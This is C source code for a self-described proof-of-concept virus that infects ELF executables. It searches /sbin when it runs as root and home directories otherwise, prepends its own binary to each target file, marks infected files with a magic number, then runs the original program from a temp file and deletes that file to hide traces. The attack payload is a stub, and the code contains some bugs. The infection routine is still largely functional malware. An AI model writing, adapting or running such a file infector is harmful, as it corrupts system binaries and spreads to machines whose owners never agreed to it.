#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <wait.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <dirent.h>
#include <elf.h>
#include <fcntl.h>
#include <pwd.h>

//The function prototypes
void launch_attack(void);
int infect(char *filename, int fd, char *virus);
void searchForELF(char *directory, char *virus);

// This value must be equal to the size of the compiled virus.
// Adjust it if the size of the compiled binary changes.
#define VIRUS_SIZE 18667
#define MAGIC 6585
#define TMPLATE "/home/iury"                                                      
#define MAX_INFECT 5
#define MAX_SIZE 1024
static int magic = MAGIC;
int infections = 0;

//The Main Function

int main(int argc, char *argv[], char *env_ptr[]) {

    printf("\n Inside main \n");

    //Variable declaration
    struct stat st;
    int fd1, fd2;
    uid_t uid;
    pid_t pid;
    char * host = NULL;
    char virus[VIRUS_SIZE];
    char tmp_file[MAX_SIZE];
    struct passwd info;
    int len = 0;

    //Open the file passed as parameter
    fd1 = open(argv[0], O_RDONLY, 0);

    //Get the file`s stats
    if (fstat(fd1, &st) < 0) {
        printf("\n fstat() failed \n");
        return -1;
    }

    //Read the file
    if (read(fd1, virus, VIRUS_SIZE) != VIRUS_SIZE) {
        printf("\n read() failed \n");
        return 1;
    }

    //Get the current user id
    uid = geteuid();

    //If they are the root
    if (uid == 0) {

        //Add more system directories containing important binaries
        searchForELF("/sbin", virus);

        //Added my own directory as I wanted only select files to be infected.
        if (infections < MAX_INFECT)
            searchForELF("/home/iury", virus);

        //Launch the attack
        launch_attack();
    } else {

        /* The next three (commented) lines find the
           user's login directory and try to infect
           all the ELF executables it can*/

        info = *getpwuid(uid);

        searchForELF(info.pw_dir, virus);

        //Added my own directory as I wanted only select files to be infected.
        if (infections < MAX_INFECT)
            searchForELF("/home/iury", virus);

    }

    /* Files infected, if the virus was executed
       from an executable, go ahead and launch that
       executable */
    len = st.st_size - VIRUS_SIZE;

    if (!len) {
        printf("\n Virus executed from source and not from any infected executable. Exiting gracefully\n");
        return 0;
    } else {
        printf("\n Virus executed by an infected executable.  Launching the executable now...\n");
    }

    //Seek at the begining of executable code that user intended to run
    if (lseek(fd1, VIRUS_SIZE, SEEK_SET) != VIRUS_SIZE) {
        printf("\n lseek() failed \n");
        return -1;
    }

    //Allocate some memory to hold the executable code in bytes
    host = (char*) malloc(len);
    if (host == NULL) {
        printf("\n malloc() returned NULL while allocating [%d] bytes\n", len);
        return -1;
    }

    //Read the bytes
    if (read(fd1, host, len) != len) {
        printf("\n read() failed \n");
        return -1;
    }

    //Close the first file
    close(fd1);

    //Create a temp file
    strncpy(tmp_file, TMPLATE, MAX_SIZE);

    fd2 = mkstemp(tmp_file);


    if (fd2 < 0) {
        printf("\n Temporary file creation failed \n");
        return -1;
    }

    if (write(fd2, host, len) != len) {
        printf("\n write() failed\n");
        return 1;
    }

    //Change the permission
    fchmod(fd2, st.st_mode);

    free(host);

    //Close the second file
    close(fd2);

    //Create a separate process and run host
    pid = fork();

    //Check for errors
    if (pid < 0) {
        printf("\n Fork() failed \n");
        return 1;
    }

    if (pid == 0) {
        exit(execve(tmp_file, argv, env_ptr));
    }

    if (waitpid(pid, NULL, 0) != pid) {
        printf("\n WaitPid() failed \n");
        return -1;
    }

    //Remove the temporary file (Erase evidence of all the wrong-doings)
    unlink(tmp_file);
    return 0;
}

//Infect the file

int infect(char *filename, int fd1, char *virus) {

    printf("\n Inside infect \n");

    //Variables declaration
    int fd;
    struct stat st;
    char *host;
    char tmp_file[MAX_SIZE];
    int chkmagic;
    int offset;
    Elf32_Ehdr hdr;

    //Check ELF Header
    if (read(fd1, &hdr, sizeof (hdr)) != sizeof (hdr)) {
        printf("\n read() failed \n");
        return -1;
    }
    if (hdr.e_ident[0] != ELFMAG0 || hdr.e_ident[1] != ELFMAG1 || hdr.e_ident[2] != ELFMAG2
            || hdr.e_ident[3] != ELFMAG3) {
        printf("\n Not an ELF file \n");
        return -1;
    }
    if (hdr.e_type != ET_EXEC && hdr.e_type != ET_DYN) {
        printf("\n Seems to be a core dump, skipping...\n");
        return -1;
    }

    //Check for MAGIC number
    if (fstat(fd1, &st) < 0) {
        printf("\n fstat() failed \n");
        return -1;
    }

    offset = st.st_size - sizeof (magic);

    if (lseek(fd1, offset, SEEK_SET) != offset) {
        printf("\n lseek() failed \n");
        return -1;
    }
    if (read(fd1, &chkmagic, sizeof (magic)) != sizeof (magic)) {
        printf("\n read() failed \n");
        return -1;
    }

    //Check if already infected by this virus
    if (chkmagic == MAGIC) {
        printf("\n Executable is already infected by our virus \n");
        return -1;
    }
    if (lseek(fd1, 0, SEEK_SET) != 0) {
        printf("\n lseek() failed \n");
        return -1;
    }

    //create and write the virus code in a temporary file
    strncpy(tmp_file, TMPLATE, MAX_SIZE);

    //Create the temporary file
    fd = mkstemp(tmp_file);

    //Check if it is okay
    if (fd < 0) {
        printf("\n mkstemp() failed \n");
        return -1;
    }
    if (write(fd, virus, VIRUS_SIZE) != VIRUS_SIZE) {
        printf("\n write() failed \n");
        return -1;
    }

    //Allocate memory for actual executable and read it
    host = (char *) malloc(st.st_size);

    if (host == NULL) {
        printf("\n malloc() failed \n");
        return -1;
    }

    //Read the current executable
    if (read(fd1, host, st.st_size) != st.st_size) {
        printf("\n read() failed \n");
        return -1;
    }

    //Write actual executable at the end of file
    if (write(fd, host, st.st_size) != st.st_size) {

        printf("\n write() failed \n");
        return -1;

        //Write magic number at the end
        if (write(fd, &magic, sizeof (magic)) != sizeof (magic)) {
            printf("\n write() failed \n");
            return -1;
        }
    }

    //Change the owner
    if (fchown(fd, st.st_uid, st.st_gid) < 0) {
        printf("\n fchown() failed \n");
        return -1;
    }

    //Change the permissions
    if (fchmod(fd, st.st_mode) < 0) {
        printf("\n fchmod() failed \n");
        return -1;
    }

    //Rename temporary file with original filename
    if (rename(tmp_file, filename) < 0) {
        perror("rename(): ");
        printf("\n rename() failed: %s, %s \n", tmp_file, filename);
        return -1;
    }

    //Close the file
    close(fd);

    //Free the memory
    free(host);

    infections++;

    //File was infected
    printf("***Infected %s.\n", filename);

    return 0;
}

//Search for executables

void searchForELF(char *directory, char *virus) {

    printf("\n Inside searchForELF \n");

    //Variables declaration
    int count;
    DIR *dptr;
    struct dirent *ptr;
    int fd1, fd2;
    struct stat st;
    char filename[256];

    printf("Directory = %s\n", directory);

    //Open directory
    dptr = opendir(directory);

    //Read directory
    ptr = readdir(dptr);

    //Go and find some files to infect
    if (ptr != NULL) {

        //For each file found
        for (count = 0; (ptr = readdir(dptr)) != NULL && infections < MAX_INFECT; count++) {

            //Copy the string
            strncpy(filename, directory, 255);

            //Concat the /
            strcat(filename, "/");

            //Concat the new string
            strncat(filename, ptr->d_name, 255 - strlen(filename));

            //Open the file
            fd1 = open(filename, O_RDONLY, 0);

            printf("\n Found ==> [%s] \n", filename);

            //If the file/directory is okay
            if (fd1 >= 0) {

                //Get the file/directory stats
                fstat(fd1, &st);

                //If it is a directory
                if (S_ISDIR(st.st_mode)) {

                    printf("It is a directory\n");

                    //Is it is not the back pointer or a hidden directory
                    if (!(strcmp(ptr->d_name, "..")) && (!strcmp(ptr->d_name, "."))) {

                        //Enter in the directory and infect the files there
                        searchForELF(filename, virus);
                    }

                } else if (S_ISREG(st.st_mode)) { //If it is a regular file

                    //Open the file
                    fd2 = open(filename, O_RDWR, 0);

                    //If the file is okay
                    if (fd2 >= 0) {

                        //Infect the file
                        infect(filename, fd2, virus);
                    } else {
                        printf("\n Could not open [%s]", filename);
                    }
                }

                //Close the second file
                close(fd2);

            }

            //Close the first file
            close(fd1);
        }

        //Close the directory
        closedir(dptr);
    }
}

//Launch the attack

void launch_attack(void) {
    // This function is left as a dummy as this code is
    // only proof of concept, and I did not want to
    // expose any dangerous stuff.
    printf("\n Attack launched \n");
}
